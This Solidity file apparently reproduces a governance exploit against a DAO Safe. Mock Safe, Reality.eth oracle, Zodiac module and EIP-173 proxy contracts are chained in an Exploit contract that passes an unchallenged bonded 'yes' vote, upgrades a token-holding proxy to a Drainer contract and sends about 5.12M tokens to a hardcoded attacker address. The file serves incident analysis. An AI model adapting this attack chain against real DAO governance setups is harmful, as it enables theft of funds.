// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// =============================================================================
//  ZKPanther (Base) — Reality.eth governance module → Safe upgrade power → drain
//  (root-cause reproduction; sweep() was only the last mile).
//
//  The Panther Base DAO Safe has a Zodiac RealityModuleETH enabled. Its
//  executeProposal path is gated ONLY by an unchallenged Reality.eth "yes"
//  (min 0.5 ETH bond, 12h timeout + 8h cooldown) — there is NO allowlist on the
//  proposal's (to, data). So a single unchallenged YES lets ANYONE exec ANY
//  transaction AS THE SAFE, and the Safe owns upgradeable EIP-173 proxies that
//  hold protocol ZKP. The attacker's proposal "zkp-reexploit" made the Safe
//  `upgradeToAndCall` a ZKP-holding proxy to a drainer, pulling ~5.12M ZKP out.
//
//  This synthetic reproduces the FULL chain with the real vulnerable patterns:
//   - RealityModule.executeProposalWithIndex exec gate (require oracle YES; exec)
//     reproduced VERBATIM (marked @>).
//   - EIP-173 upgradeToAndCall (onlyOwner=Safe → _setImplementation → delegatecall).
//   - Safe.execTransactionFromModule (module → Safe call).
//  Multi-day bonding timing is abstracted (cooldown 0, oracle pre-finalized YES),
//  exactly as the historical trace cannot re-simulate a 20h challenge window.
// =============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

/*//////////////////////////////////////////////////////////////
        ZKP — minimal OptimismMintableERC20-style token
//////////////////////////////////////////////////////////////*/
contract ZKPToken {
    string public name = "ZKPanther";
    string public symbol = "ZKP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   Gnosis-Safe–style avatar. A module the Safe has enabled can exec
   ANY transaction as the Safe via execTransactionFromModule.
//////////////////////////////////////////////////////////////*/
contract Safe {
    mapping(address => bool) public isModuleEnabled;

    function enableModule(address module) external {
        isModuleEnabled[module] = true;
    }

    // operation: 0 = Call, 1 = DelegateCall (only Call used here)
    function execTransactionFromModule(address to, uint256 value, bytes memory data, uint8 /*operation*/ )
        external
        returns (bool success)
    {
        require(isModuleEnabled[msg.sender], "GS104"); // not an enabled module
        (success,) = to.call{value: value}(data);
    }
}

/*//////////////////////////////////////////////////////////////
   Reality.eth oracle (mock). The attacker posts a "yes" answer with
   a 0.5 ETH bond; with no counter-bond it finalizes YES. resultFor
   returns 1 (true) — the module's sole approval signal.
//////////////////////////////////////////////////////////////*/
contract RealityOracle {
    mapping(bytes32 => bytes32) internal answer;
    mapping(bytes32 => uint256) internal bond;
    uint256 internal nonce;

    function askQuestion(bytes32 questionHash) external returns (bytes32 questionId) {
        questionId = keccak256(abi.encodePacked(questionHash, nonce++));
    }

    // Attacker submits "yes" (bytes32(1)) backed by `_bond`; unchallenged → final.
    function submitAnswer(bytes32 questionId, uint256 _bond) external {
        answer[questionId] = bytes32(uint256(1));
        bond[questionId] = _bond;
    }

    function resultFor(bytes32 questionId) external view returns (bytes32) {
        return answer[questionId];
    }

    function getBond(bytes32 questionId) external view returns (uint256) {
        return bond[questionId];
    }

    function getFinalizeTS(bytes32) external pure returns (uint32) {
        return 0; // pre-finalized (challenge window elapsed with no dispute)
    }
}

interface IOracle {
    function askQuestion(bytes32 questionHash) external returns (bytes32);
    function resultFor(bytes32 questionId) external view returns (bytes32);
    function getBond(bytes32 questionId) external view returns (uint256);
    function getFinalizeTS(bytes32 questionId) external view returns (uint32);
}

interface IAvatar {
    function execTransactionFromModule(address to, uint256 value, bytes memory data, uint8 operation)
        external
        returns (bool);
}

/*//////////////////////////////////////////////////////////////
   Zodiac RealityModuleETH (minimal). The executeProposal exec gate
   is reproduced VERBATIM: the ONLY approval check is an unchallenged
   Reality "yes" — no allowlist on (to, data). Any such proposal execs
   as the Safe. This is the root cause.
//////////////////////////////////////////////////////////////*/
contract RealityModule {
    address public avatar; // the Safe
    IOracle public oracle;
    uint256 public minimumBond;
    uint32 public questionCooldown;

    mapping(bytes32 => bytes32) public questionIds; // questionHash → questionId
    mapping(bytes32 => bool) public executedProposalTransactions;

    constructor(address _avatar, IOracle _oracle, uint256 _minBond, uint32 _cooldown) {
        avatar = _avatar;
        oracle = _oracle;
        minimumBond = _minBond;
        questionCooldown = _cooldown;
    }

    function buildQuestion(string memory proposalId, bytes32[] memory /*txHashes*/ )
        public
        pure
        returns (string memory)
    {
        return proposalId;
    }

    function getTransactionHash(address to, uint256 value, bytes memory data, uint8 operation, uint256 nonce)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encode(to, value, keccak256(data), operation, nonce));
    }

    // Anyone can submit a proposal — it just opens a Reality question.
    function addProposal(string memory proposalId, bytes32[] memory txHashes) public {
        bytes32 questionHash = keccak256(bytes(buildQuestion(proposalId, txHashes)));
        bytes32 questionId = oracle.askQuestion(questionHash);
        questionIds[questionHash] = questionId;
    }

    function executeProposalWithIndex(
        string memory proposalId,
        bytes32[] memory txHashes,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 txIndex
    ) public {
        bytes32 questionHash = keccak256(bytes(buildQuestion(proposalId, txHashes)));
        bytes32 questionId = questionIds[questionHash];
        require(questionId != bytes32(0), "No question id set for provided proposal");

        bytes32 txHash = getTransactionHash(to, value, data, operation, txIndex);
        require(txHashes[txIndex] == txHash, "Unexpected transaction hash");

        // @> ROOT CAUSE: the ONLY approval gate is an unchallenged Reality "yes".
        // @> There is no allowlist on (to, data) — any proposal that reaches YES
        // @> can be executed AS THE SAFE.
        require(oracle.resultFor(questionId) == bytes32(uint256(1)), "Transaction was not approved");
        uint256 minBond = minimumBond;
        require(minBond == 0 || minBond <= oracle.getBond(questionId), "Bond on question not high enough");
        uint32 finalizeTs = oracle.getFinalizeTS(questionId);
        require(finalizeTs + uint256(questionCooldown) < block.timestamp, "Wait for additional cooldown");
        require(!executedProposalTransactions[txHash], "Cannot execute transaction again");
        executedProposalTransactions[txHash] = true;

        // @> exec the attacker-chosen transaction AS THE SAFE.
        require(IAvatar(avatar).execTransactionFromModule(to, value, data, operation), "Module transaction failed");
    }
}

/*//////////////////////////////////////////////////////////////
   EIP-173 proxy (real pattern). Owner (the Safe) can swap the
   implementation and delegatecall init data in one call. When the
   Reality module can exec as the Safe, upgradeToAndCall becomes
   attacker-reachable.
//////////////////////////////////////////////////////////////*/
contract EIP173Proxy {
    // EIP-1967 implementation slot.
    bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public owner;

    constructor(address _owner, address implementation) {
        owner = _owner;
        _setImplementation(implementation, "");
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_AUTHORIZED");
        _;
    }

    function upgradeTo(address newImplementation) external onlyOwner {
        _setImplementation(newImplementation, "");
    }

    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable onlyOwner {
        _setImplementation(newImplementation, data);
    }

    function _setImplementation(address newImplementation, bytes memory data) internal {
        assembly {
            sstore(IMPL_SLOT, newImplementation)
        }
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "upgrade call failed");
        }
    }

    fallback() external payable {
        address impl;
        assembly {
            impl := sload(IMPL_SLOT)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

// Benign initial implementation (what the proxy legitimately delegated to).
contract Vault {
    function ping() external pure returns (bool) {
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   Malicious drainer implementation. Once the Safe upgradeToAndCall's
   the proxy to this and delegatecalls drain(), it runs in the PROXY's
   context and sends the proxy's entire ZKP balance to the attacker.
//////////////////////////////////////////////////////////////*/
contract Drainer {
    function drain(address to, address token) external {
        // address(this) == the proxy (delegatecall context)
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to, bal);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — the full governance takeover in one run():
   addProposal → unchallenged Reality YES (0.5 ETH bond) →
   executeProposal → Safe upgradeToAndCall(proxy → Drainer) →
   proxy drains ~5.12M ZKP to the attacker EOA.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    // Real ZKPanther attacker EOA (drain recipient / measured profit sink).
    address internal constant ATTACKER = 0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6;
    uint256 internal constant STOLEN_ZKP = 5_124_773_626006184526790998; // ~5,124,773.626 ZKP

    ZKPToken public zkp;
    Safe public safe;
    EIP173Proxy public proxy;
    RealityOracle public oracle;
    RealityModule public module;
    Drainer public drainer;

    function run() external payable {
        // --- protocol deployment (Safe owns an upgradeable ZKP-holding proxy) ---
        zkp = new ZKPToken();
        safe = new Safe();
        Vault vault = new Vault();
        proxy = new EIP173Proxy(address(safe), address(vault)); // owner = Safe
        zkp.mint(address(proxy), STOLEN_ZKP); // proxy custodies protocol ZKP

        oracle = new RealityOracle();
        // minBond 0.5 ETH, cooldown 0 (multi-day timing abstracted — see header).
        module = new RealityModule(address(safe), IOracle(address(oracle)), 0.5 ether, 0);
        safe.enableModule(address(module)); // RealityModule is an enabled Safe module

        drainer = new Drainer();

        // --- attacker's proposal: make the Safe upgrade the proxy to the drainer ---
        bytes memory drainData = abi.encodeWithSelector(Drainer.drain.selector, ATTACKER, address(zkp));
        bytes memory execData =
            abi.encodeWithSelector(EIP173Proxy.upgradeToAndCall.selector, address(drainer), drainData);

        string memory proposalId = "zkp-reexploit";
        bytes32 txHash = module.getTransactionHash(address(proxy), 0, execData, 0, 0);
        bytes32[] memory txHashes = new bytes32[](1);
        txHashes[0] = txHash;

        // 1) anyone can open the proposal (Reality question)
        module.addProposal(proposalId, txHashes);

        // 2) attacker posts an unchallenged "yes" with a 0.5 ETH bond
        bytes32 qhash = keccak256(bytes(module.buildQuestion(proposalId, txHashes)));
        bytes32 qid = module.questionIds(qhash);
        oracle.submitAnswer(qid, 0.5 ether);

        // 3) execute: module execs upgradeToAndCall AS THE SAFE → proxy drains to attacker
        module.executeProposalWithIndex(proposalId, txHashes, address(proxy), 0, execData, 0, 0);
    }
}
